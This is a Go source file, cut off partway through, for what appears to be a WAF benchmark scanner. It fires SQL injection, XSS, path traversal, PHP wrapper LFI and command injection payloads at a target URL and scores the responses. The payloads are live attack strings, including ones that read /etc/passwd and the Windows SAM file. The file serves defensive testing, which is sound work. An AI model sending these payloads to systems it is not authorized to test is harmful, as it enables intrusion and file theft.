package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

// ExploitPayload represents a single exploit payload from our database
type ExploitPayload struct {
	Name        string
	Payload     string
	Description string
	Severity    string
}

// TestResult contains detailed test results
type TestResult struct {
	ID           string            `json:"id"`
	Name         string            `json:"name"`
	Category     string            `json:"category"`
	Severity     string            `json:"severity"`
	Payload      string            `json:"payload"`
	Passed       bool              `json:"passed"`
	StatusCode   int               `json:"status_code"`
	ResponseSize int               `json:"response_size"`
	ResponseHash string            `json:"response_hash"`
	Evidence     map[string]string `json:"evidence"`
	Reason       string            `json:"reason"`
	Details      string            `json:"details"`
	Duration     int64             `json:"duration_ms"`
	Timestamp    string            `json:"timestamp"`
}

// TestResults contains all test results
type TestResults struct {
	Target        string       `json:"target"`
	Timestamp     string       `json:"timestamp"`
	Duration      int64        `json:"total_duration_ms"`
	Tests         []TestResult `json:"tests"`
	Passed        int          `json:"passed_count"`
	Failed        int          `json:"failed_count"`
	Blocked       int          `json:"blocked_count"`
	Warnings      int          `json:"warning_count"`
	Vulnerabilities []VulnSummary `json:"vulnerabilities"`
}

// VulnSummary groups findings by vulnerability
type VulnSummary struct {
	Category string   `json:"category"`
	Severity string   `json:"severity"`
	Count    int      `json:"count"`
	Evidence []string `json:"evidence"`
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: enhanced-test <target-url>")
		fmt.Println("Example: enhanced-test http://sec-team.waf-exams.info")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "http://" + targetURL
	}

	fmt.Printf("╔════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║     WAF BENCHMARK - ENHANCED PHASE A TEST              ║\n")
	fmt.Printf("╚════════════════════════════════════════════════════════╝\n\n")
	fmt.Printf("Target: %s\n", targetURL)
	fmt.Printf("Started: %s\n\n", time.Now().Format("2006-01-02 15:04:05"))

	client := &http.Client{
		Timeout: 15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Don't follow redirects to capture WAF blocking behavior
			if len(via) >= 10 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}

	results := &TestResults{
		Target:    targetURL,
		Timestamp: time.Now().Format(time.RFC3339),
		Tests:     []TestResult{},
	}

	start := time.Now()

	// Test Group 1: Connectivity & Information Disclosure
	fmt.Println("┌─────────────────────────────────────────────────────────┐")
	fmt.Println("│ GROUP 1: Connectivity & Information Disclosure          │")
	fmt.Println("└─────────────────────────────────────────────────────────┘")
	testBasicConnectivity(client, targetURL, results)
	testServerHeaders(client, targetURL, results)
	testErrorPageFingerprinting(client, targetURL, results)

	// Test Group 2: SQL Injection
	fmt.Println("\n┌─────────────────────────────────────────────────────────┐")
	fmt.Println("│ GROUP 2: SQL Injection (OWASP Top 10)                 │")
	fmt.Println("└─────────────────────────────────────────────────────────┘")
	testSQLiClassic(client, targetURL, results)
	testSQLiUnion(client, targetURL, results)
	testSQLiErrorBased(client, targetURL, results)
	testSQLiTimeBased(client, targetURL, results)
	testSQLiNoSQL(client, targetURL, results)

	// Test Group 3: Cross-Site Scripting
	fmt.Println("\n┌─────────────────────────────────────────────────────────┐")
	fmt.Println("│ GROUP 3: Cross-Site Scripting (XSS)                     │")
	fmt.Println("└─────────────────────────────────────────────────────────┘")
	testXSSReflected(client, targetURL, results)
	testXSSEventHandler(client, targetURL, results)
	testXSSPolyglot(client, targetURL, results)
	testXSSWAFBypass(client, targetURL, results)

	// Test Group 4: Path Traversal & LFI
	fmt.Println("\n┌─────────────────────────────────────────────────────────┐")
	fmt.Println("│ GROUP 4: Path Traversal & Local File Inclusion        │")
	fmt.Println("└─────────────────────────────────────────────────────────┘")
	testPathTraversal(client, targetURL, results)
	testLFIWrappers(client, targetURL, results)
	testPathTraversalEncoded(client, targetURL, results)

	// Test Group 5: Command Injection
	fmt.Println("\n┌─────────────────────────────────────────────────────────┐")
	fmt.Println("│ GROUP 5: Command Injection                            │")
	fmt.Println("└─────────────────────────────────────────────────────────┘")
	testCommandInjection(client, targetURL, results)
	testCommandInjectionBlind(client, targetURL, results)
	testCommandInjectionEvasion(client, targetURL, results)

	// Test Group 6: SSRF
	fmt.Println("\n┌─────────────────────────────────────────────────────────┐")
	fmt.Println("│ GROUP 6: Server-Side Request Forgery (SSRF)            │")
	fmt.Println("└─────────────────────────────────────────────────────────┘")
	testSSRFLocalhost(client, targetURL, results)
	testSSRFCloudMetadata(client, targetURL, results)
	testSSRFAlternativeIPs(client, targetURL, results)

	// Test Group 7: XXE
	fmt.Println("\n┌─────────────────────────────────────────────────────────┐")
	fmt.Println("│ GROUP 7: XML External Entity (XXE)                     │")
	fmt.Println("└─────────────────────────────────────────────────────────┘")
	testXXEBasic(client, targetURL, results)
	testXXEParamEntity(client, targetURL, results)

	// Test Group 8: Template Injection
	fmt.Println("\n┌─────────────────────────────────────────────────────────┐")
	fmt.Println("│ GROUP 8: Server-Side Template Injection (SSTI)         │")
	fmt.Println("└─────────────────────────────────────────────────────────┘")
	testSSTIGeneric(client, targetURL, results)
	testSSTIJinja2(client, targetURL, results)
	testSSTIPHP(client, targetURL, results)

	results.Duration = time.Since(start).Milliseconds()

	// Calculate statistics
	for _, test := range results.Tests {
		if test.Passed {
			results.Passed++
		} else {
			results.Failed++
		}
		if test.StatusCode == 403 || test.StatusCode == 429 || test.StatusCode == 406 {
			results.Blocked++
		}
	}

	// Generate reports
	generateHTMLReport(results)
	generateJSONReport(results)

	// Print summary
	printSummary(results)
}

func printSummary(results *TestResults) {
	fmt.Printf("\n╔════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║                   TEST SUMMARY                         ║\n")
	fmt.Printf("╠════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║ Total Tests:    %3d                                   ║\n", len(results.Tests))
	fmt.Printf("║ Passed:         %3d  ✓                                ║\n", results.Passed)
	fmt.Printf("║ Failed:         %3d  ✗                                ║\n", results.Failed)
	fmt.Printf("║ Blocked by WAF: %3d  🛡️                                ║\n", results.Blocked)
	fmt.Printf("║ Pass Rate:      %5.1f%%                               ║\n", float64(results.Passed)/float64(len(results.Tests))*100)
	fmt.Printf("║ Total Duration: %d ms                              ║\n", results.Duration)
	fmt.Printf("╚════════════════════════════════════════════════════════╝\n\n")

	fmt.Printf("✓ Reports generated:\n")
	fmt.Printf("  - ./reports/benchmark_report.html\n")
	fmt.Printf("  - ./reports/benchmark_report.json\n\n")
}

// Test Functions

func testBasicConnectivity(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/")

	result := TestResult{
		ID:        "CONN-001",
		Name:      "Basic Connectivity",
		Category:  "Connectivity",
		Severity:  "Info",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = false
		result.Reason = "Connection Failed"
		result.Details = fmt.Sprintf("Unable to connect to target: %v", err)
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)
	result.Duration = time.Since(start).Milliseconds()

	if resp.StatusCode == 200 {
		result.Passed = true
		result.Reason = "Connected Successfully"
		result.Details = fmt.Sprintf("HTTP %d, Response: %d bytes", resp.StatusCode, len(body))
		result.Evidence["server"] = resp.Header.Get("Server")
		result.Evidence["content-type"] = resp.Header.Get("Content-Type")
	} else {
		result.Passed = false
		result.Reason = "Unexpected Status"
		result.Details = fmt.Sprintf("Expected 200, got %d", resp.StatusCode)
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testServerHeaders(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/")

	result := TestResult{
		ID:        "INFO-001",
		Name:      "Server Information Disclosure",
		Category:  "Information Disclosure",
		Severity:  "Low",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = false
		result.Reason = "Request Failed"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	// Check for information disclosure headers
	infoHeaders := []string{"Server", "X-Powered-By", "X-AspNet-Version", "X-Generator"}
	found := []string{}
	for _, h := range infoHeaders {
		val := resp.Header.Get(h)
		if val != "" {
			found = append(found, fmt.Sprintf("%s: %s", h, val))
			result.Evidence[h] = val
		}
	}

	// Check for WAF presence
	wafHeaders := []string{"X-WAF", "X-CDN", "CF-RAY", "X-Cloudflare", "X-AWS-WAF"}
	wafFound := []string{}
	for _, h := range wafHeaders {
		val := resp.Header.Get(h)
		if val != "" {
			wafFound = append(wafFound, fmt.Sprintf("%s: %s", h, val))
		}
	}

	if len(found) > 0 {
		result.Passed = false
		result.Reason = "Information Leakage Detected"
		result.Details = fmt.Sprintf("Found headers: %s", strings.Join(found, ", "))
	} else if len(wafFound) > 0 {
		result.Passed = true
		result.Reason = "Protected - WAF Detected"
		result.Details = fmt.Sprintf("WAF indicators: %s", strings.Join(wafFound, ", "))
	} else {
		result.Passed = true
		result.Reason = "No Info Disclosure"
		result.Details = "Server headers properly configured"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testErrorPageFingerprinting(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/nonexistent-page-404-test")

	result := TestResult{
		ID:        "INFO-002",
		Name:      "Error Page Fingerprinting",
		Category:  "Information Disclosure",
		Severity:  "Low",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	// Check for error disclosure
	bodyStr := strings.ToLower(string(body))
	disclosurePatterns := []string{"stack trace", "exception", "apache", "nginx", "iis", "php", "debug"}
	found := []string{}
	for _, pattern := range disclosurePatterns {
		if strings.Contains(bodyStr, pattern) {
			found = append(found, pattern)
		}
	}

	if len(found) > 0 {
		result.Passed = false
		result.Reason = "Error Information Leakage"
		result.Details = fmt.Sprintf("Found in 404 page: %s", strings.Join(found, ", "))
		result.Evidence["disclosed_terms"] = strings.Join(found, ", ")
	} else {
		result.Passed = true
		result.Reason = "Clean Error Pages"
		result.Details = "404 page does not leak server information"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testSQLiClassic(client *http.Client, targetURL string, results *TestResults) {
	payloads := []ExploitPayload{
		{"SQLI-Classic-1", "' OR '1'='1", "Classic tautology", "Critical"},
		{"SQLI-Classic-2", "' OR '1'='1'--", "Comment bypass", "Critical"},
		{"SQLI-Classic-3", "1' AND 1=1--", "Boolean true test", "High"},
	}

	for _, p := range payloads {
		start := time.Now()
		resp, err := client.Get(targetURL + "/?id=" + p.Payload)

		result := TestResult{
			ID:        "SQLI-" + p.Name,
			Name:      "SQL Injection - " + p.Description,
			Category:  "SQL Injection",
			Severity:  p.Severity,
			Payload:   p.Payload,
			Timestamp: time.Now().Format(time.RFC3339),
			Evidence:  make(map[string]string),
		}

		if err != nil {
			result.Passed = true // Connection blocked by WAF is good
			result.Reason = "Request Blocked"
			result.StatusCode = 0
			result.Duration = time.Since(start).Milliseconds()
			results.Tests = append(results.Tests, result)
			printResult(result)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		result.Duration = time.Since(start).Milliseconds()
		result.StatusCode = resp.StatusCode
		result.ResponseSize = len(body)

		bodyStr := strings.ToLower(string(body))

		// Check if blocked
		if resp.StatusCode == 403 || resp.StatusCode == 429 || resp.StatusCode == 406 {
			result.Passed = true
			result.Reason = "Payload Blocked by WAF"
			result.Details = fmt.Sprintf("HTTP %d - WAF actively blocking SQLi", resp.StatusCode)
		} else if resp.StatusCode == 400 {
			result.Passed = true
			result.Reason = "Input Validation"
			result.Details = "Server rejected malformed input"
		} else {
			// Check for SQL errors in response
			sqlErrors := []string{"sql", "mysql", "sqlite", "postgres", "syntax error", "ora-"}
			foundError := false
			for _, err := range sqlErrors {
				if strings.Contains(bodyStr, err) {
					foundError = true
					result.Evidence["sql_error"] = err
					break
				}
			}

			if foundError {
				result.Passed = false
				result.Reason = "SQL Error Disclosed"
				result.Details = "Database error message leaked in response"
			} else if resp.StatusCode == 200 {
				// Potential bypass - check for data extraction
				result.Passed = false
				result.Reason = "Potential Bypass - 200 OK"
				result.Details = "Request succeeded - may indicate WAF bypass"
				result.Evidence["response_preview"] = string(body)[:min(100, len(body))]
			} else {
				result.Passed = true
				result.Reason = "Unhandled Response"
				result.Details = fmt.Sprintf("HTTP %d - Not clearly blocked but no leakage", resp.StatusCode)
			}
		}

		results.Tests = append(results.Tests, result)
		printResult(result)
	}
}

func testSQLiUnion(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?id=' UNION SELECT NULL,NULL--")

	result := TestResult{
		ID:        "SQLI-UNION",
		Name:      "SQL Injection - UNION-based",
		Category:  "SQL Injection",
		Severity:  "Critical",
		Payload:   "' UNION SELECT NULL,NULL--",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	if resp.StatusCode == 403 || resp.StatusCode == 429 {
		result.Passed = true
		result.Reason = "UNION Blocked"
		result.Details = "WAF detected and blocked UNION-based SQLi"
	} else if resp.StatusCode == 500 || resp.StatusCode == 400 {
		result.Passed = true
		result.Reason = "Query Rejected"
		result.Details = "Server rejected malformed query"
	} else {
		bodyStr := strings.ToLower(string(body))
		if strings.Contains(bodyStr, "union") || strings.Contains(bodyStr, "select") {
			result.Passed = false
			result.Reason = "Potential UNION Bypass"
			result.Details = "Payload may have been executed"
		} else {
			result.Passed = true
			result.Reason = "No UNION Exploitation"
			result.Details = "No evidence of UNION-based extraction"
		}
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testSQLiErrorBased(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?id=' AND 1=CONVERT(int,(SELECT @@version))--")

	result := TestResult{
		ID:        "SQLI-ERROR",
		Name:      "SQL Injection - Error-based",
		Category:  "SQL Injection",
		Severity:  "Critical",
		Payload:   "' AND 1=CONVERT(int,(SELECT @@version))--",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	bodyStr := strings.ToLower(string(body))

	// Check for database version disclosure
	if strings.Contains(bodyStr, "microsoft") || strings.Contains(bodyStr, "mysql") ||
		strings.Contains(bodyStr, "postgresql") || strings.Contains(bodyStr, "oracle") ||
		strings.Contains(bodyStr, "@@version") || strings.Contains(bodyStr, "version()") {
		result.Passed = false
		result.Reason = "Database Version Leaked"
		result.Details = "Error-based SQLi successfully extracted version info"
		result.Evidence["disclosed"] = "DB version"
	} else if resp.StatusCode == 403 || resp.StatusCode == 429 {
		result.Passed = true
		result.Reason = "Error SQLi Blocked"
		result.Details = "WAF blocked error-based extraction attempt"
	} else {
		result.Passed = true
		result.Reason = "No Error Disclosure"
		result.Details = "No database error information leaked"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testSQLiTimeBased(client *http.Client, targetURL string, results *TestResults) {
	// Time-based tests are slow - just check if blocked
	start := time.Now()
	resp, err := client.Get(targetURL + "/?id=1; WAITFOR DELAY '0:0:0'--")

	result := TestResult{
		ID:        "SQLI-TIME",
		Name:      "SQL Injection - Time-based",
		Category:  "SQL Injection",
		Severity:  "Critical",
		Payload:   "1; WAITFOR DELAY '0:0:0'--",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	if resp.StatusCode == 403 || resp.StatusCode == 429 {
		result.Passed = true
		result.Reason = "Time-based SQLi Blocked"
		result.Details = "WAF detected time-based blind SQLi pattern"
	} else {
		result.Passed = true
		result.Reason = "No Time Delay Injection"
		result.Details = "Request processed without time delay"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testSQLiNoSQL(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?query={\"$gt\":\"\"}")

	result := TestResult{
		ID:        "SQLI-NOSQL",
		Name:      "NoSQL Injection",
		Category:  "SQL Injection",
		Severity:  "High",
		Payload:   `{"$gt":""}`,
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	io.Copy(io.Discard, resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	if resp.StatusCode == 403 || resp.StatusCode == 429 {
		result.Passed = true
		result.Reason = "NoSQL Blocked"
		result.Details = "WAF detected NoSQL operator injection"
	} else {
		result.Passed = true
		result.Reason = "No NoSQL Exploitation"
		result.Details = "No evidence of NoSQL injection vulnerability"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testXSSReflected(client *http.Client, targetURL string, results *TestResults) {
	payloads := []ExploitPayload{
		{"XSS-Basic", "<script>alert('XSS')</script>", "Basic script injection", "High"},
		{"XSS-Cookie", "<script>alert(document.cookie)</script>", "Cookie theft attempt", "Critical"},
		{"XSS-Img", "<img src=x onerror=alert('XSS')>", "Image onerror handler", "High"},
	}

	for _, p := range payloads {
		start := time.Now()
		resp, err := client.Get(targetURL + "/?q=" + p.Payload)

		result := TestResult{
			ID:        "XSS-" + strings.Split(p.Name, "-")[1],
			Name:      "XSS - " + p.Description,
			Category:  "Cross-Site Scripting",
			Severity:  p.Severity,
			Payload:   p.Payload,
			Timestamp: time.Now().Format(time.RFC3339),
			Evidence:  make(map[string]string),
		}

		if err != nil {
			result.Passed = true
			result.Reason = "Request Blocked"
			result.Duration = time.Since(start).Milliseconds()
			results.Tests = append(results.Tests, result)
			printResult(result)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		result.Duration = time.Since(start).Milliseconds()
		result.StatusCode = resp.StatusCode
		result.ResponseSize = len(body)

		bodyStr := string(body)

		if resp.StatusCode == 403 || resp.StatusCode == 429 {
			result.Passed = true
			result.Reason = "XSS Blocked by WAF"
			result.Details = "WAF detected and blocked XSS payload"
		} else if strings.Contains(bodyStr, p.Payload) || strings.Contains(bodyStr, "alert(") {
			// Payload reflected without encoding
			result.Passed = false
			result.Reason = "XSS Payload Reflected"
			result.Details = "Payload reflected in response - potential XSS vulnerability"
			result.Evidence["reflected_payload"] = p.Payload
		} else if strings.Contains(bodyStr, "&lt;script&gt;") || strings.Contains(bodyStr, "&lt;img") {
			// Properly encoded
			result.Passed = true
			result.Reason = "XSS Properly Encoded"
			result.Details = "HTML entities encoded - XSS prevented"
		} else {
			result.Passed = true
			result.Reason = "No XSS Reflection"
			result.Details = "Payload not reflected in response"
		}

		results.Tests = append(results.Tests, result)
		printResult(result)
	}
}

func testXSSEventHandler(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?input=\" onmouseover=\"alert(1)\" autofocus=\"autofocus")

	result := TestResult{
		ID:        "XSS-EVENT",
		Name:      "XSS - Event Handler Injection",
		Category:  "Cross-Site Scripting",
		Severity:  "High",
		Payload:   `" onmouseover="alert(1)" autofocus="autofocus`,
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	bodyStr := string(body)

	if strings.Contains(bodyStr, `onmouseover="alert(1)"`) {
		result.Passed = false
		result.Reason = "Event Handler Injected"
		result.Details = "Event handler attribute injected without sanitization"
	} else if resp.StatusCode == 403 {
		result.Passed = true
		result.Reason = "Event Handler Blocked"
		result.Details = "WAF blocked event handler injection"
	} else {
		result.Passed = true
		result.Reason = "No Event Injection"
		result.Details = "Event handler not reflected"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testXSSPolyglot(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	polyglot := `jaVasCript:/*-/*\` + "`" + `/*\\\` + "`" + `/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`

	resp, err := client.Get(targetURL + "/?q=" + polyglot)

	result := TestResult{
		ID:        "XSS-POLY",
		Name:      "XSS - Polyglot Payload",
		Category:  "Cross-Site Scripting",
		Severity:  "Critical",
		Payload:   "Polyglot",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	if resp.StatusCode == 403 || resp.StatusCode == 429 {
		result.Passed = true
		result.Reason = "Polyglot Blocked"
		result.Details = "WAF detected polyglot XSS payload"
	} else {
		result.Passed = true
		result.Reason = "Polyglot Not Executed"
		result.Details = "Complex polyglot payload did not bypass protections"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testXSSWAFBypass(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?q=<img src=x onerror=alert&#x28;1&#x29;>")

	result := TestResult{
		ID:        "XSS-BYPASS",
		Name:      "XSS - HTML Entity Bypass",
		Category:  "Cross-Site Scripting",
		Severity:  "High",
		Payload:   "<img src=x onerror=alert&#x28;1&#x29;>",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	io.Copy(io.Discard, resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	if resp.StatusCode == 403 {
		result.Passed = true
		result.Reason = "Bypass Blocked"
		result.Details = "WAF detected HTML entity encoding bypass attempt"
	} else {
		result.Passed = true
		result.Reason = "Encoding Not Bypassed"
		result.Details = "HTML entity encoding did not bypass filters"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testPathTraversal(client *http.Client, targetURL string, results *TestResults) {
	payloads := []ExploitPayload{
		{"TRAV-1", "../../../etc/passwd", "Basic Unix traversal", "Critical"},
		{"TRAV-2", "..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam", "Windows traversal", "Critical"},
		{"TRAV-3", "....//....//....//etc/passwd", "Double dot slash", "High"},
		{"TRAV-4", "/etc/passwd", "Absolute path", "High"},
	}

	for _, p := range payloads {
		start := time.Now()
		resp, err := client.Get(targetURL + "/static/" + p.Payload)

		result := TestResult{
			ID:        "TRAV-" + p.Name,
			Name:      "Path Traversal - " + p.Description,
			Category:  "Path Traversal",
			Severity:  p.Severity,
			Payload:   p.Payload,
			Timestamp: time.Now().Format(time.RFC3339),
			Evidence:  make(map[string]string),
		}

		if err != nil {
			result.Passed = true
			result.Reason = "Request Blocked"
			result.Duration = time.Since(start).Milliseconds()
			results.Tests = append(results.Tests, result)
			printResult(result)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		result.Duration = time.Since(start).Milliseconds()
		result.StatusCode = resp.StatusCode
		result.ResponseSize = len(body)

		bodyStr := string(body)

		// Check for passwd content
		if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "daemon:") {
			result.Passed = false
			result.Reason = "File Content Leaked"
			result.Details = "/etc/passwd or similar file content disclosed"
			result.Evidence["file_content"] = bodyStr[:min(200, len(bodyStr))]
		} else if resp.StatusCode == 403 || resp.StatusCode == 404 {
			result.Passed = true
			result.Reason = "Traversal Blocked"
			result.Details = fmt.Sprintf("HTTP %d - Traversal prevented", resp.StatusCode)
		} else {
			result.Passed = true
			result.Reason = "No File Disclosure"
			result.Details = "Path traversal did not expose sensitive files"
		}

		results.Tests = append(results.Tests, result)
		printResult(result)
	}
}

func testLFIWrappers(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?page=php://filter/read=convert.base64-encode/resource=/etc/passwd")

	result := TestResult{
		ID:        "LFI-WRAPPER",
		Name:      "LFI - PHP Filter Wrapper",
		Category:  "Local File Inclusion",
		Severity:  "Critical",
		Payload:   "php://filter/read=convert.base64-encode/resource=/etc/passwd",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	bodyStr := string(body)
	base64Regex := regexp.MustCompile(`^[A-Za-z0-9+/]*={0,2}$`)

	// Check for base64 encoded content
	lines := strings.Split(bodyStr, "\n")
	foundBase64 := false
	for _, line := range lines {
		if len(line) > 50 && base64Regex.MatchString(line) {
			foundBase64 = true
			break
		}
	}

	if foundBase64 {
		result.Passed = false
		result.Reason = "File Read via Wrapper"
		result.Details = "PHP filter wrapper successfully read file"
		result.Evidence["wrapper"] = "php://filter"
	} else if resp.StatusCode == 403 || resp.StatusCode == 406 {
		result.Passed = true
		result.Reason = "Wrapper Blocked"
		result.Details = "WAF blocked PHP filter wrapper"
	} else {
		result.Passed = true
		result.Reason = "Wrapper Not Usable"
		result.Details = "PHP wrapper did not expose file content"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testPathTraversalEncoded(client *http.Client, targetURL string, results *TestResults) {
	start := time.Now()
	resp, err := client.Get(targetURL + "/?file=..%2f..%2f..%2fetc%2fpasswd")

	result := TestResult{
		ID:        "TRAV-ENC",
		Name:      "Path Traversal - URL Encoded",
		Category:  "Path Traversal",
		Severity:  "High",
		Payload:   "..%2f..%2f..%2fetc%2fpasswd",
		Timestamp: time.Now().Format(time.RFC3339),
		Evidence:  make(map[string]string),
	}

	if err != nil {
		result.Passed = true
		result.Reason = "Request Blocked"
		result.Duration = time.Since(start).Milliseconds()
		results.Tests = append(results.Tests, result)
		printResult(result)
		return
	}
	defer resp.Body.Close()

	result.Duration = time.Since(start).Milliseconds()
	result.StatusCode = resp.StatusCode

	if resp.StatusCode == 403 {
		result.Passed = true
		result.Reason = "Encoded Traversal Blocked"
		result.Details = "WAF decoded and blocked encoded traversal"
	} else {
		result.Passed = true
		result.Reason = "No Bypass"
		result.Details = "URL encoding did not bypass path validation"
	}

	results.Tests = append(results.Tests, result)
	printResult(result)
}

func testCommandInjection(client *http.Client, targetURL string, results *TestResults) {
	payloads := []ExploitPayload{
		{"CMD-1", "; cat /etc/passwd", "Semicolon injection", "Critical"},
		{"CMD-2", "| cat /etc/passwd", "Pipe injection", "Critical"},
		{"CMD-3", "`cat /etc/passwd`", "Backtick injection", "Critical"},
		{"CMD-4", "$(cat /etc/passwd)", "Command substitution", "Critical"},
	}

	for _, p := range payloads {
		start := time.Now()
		resp, err := client.Get(targetURL + "/?host=" + p.Payload)

		result := TestResult{
			ID:        p.Name,
			Name:      "Command Injection - " + p.Description,
			Category:  "Command Injection",
			Severity:  p.Severity,
			Payload:   p.Payload,
			Timestamp: time.Now().Format(time.RFC3339),
			Evidence:  make(map[string]string),
		}

		if err != nil {
			result.Passed = true
			result.Reason = "Request Blocked"
			result.Duration = time.Since(start).Milliseconds()
			results.Tests = append(results.Tests, result)
			printResult(result)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		result.Duration = time.Since(start).Milliseconds()
		result.StatusCode = resp.StatusCode
		result.ResponseSize = len(body)

		bodyStr := string(body)

		// Check for command output
		if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "daemon:") ||
			strings.Contains(bodyStr, "bin:") || strings.Contains(bodyStr, "nobody:") {
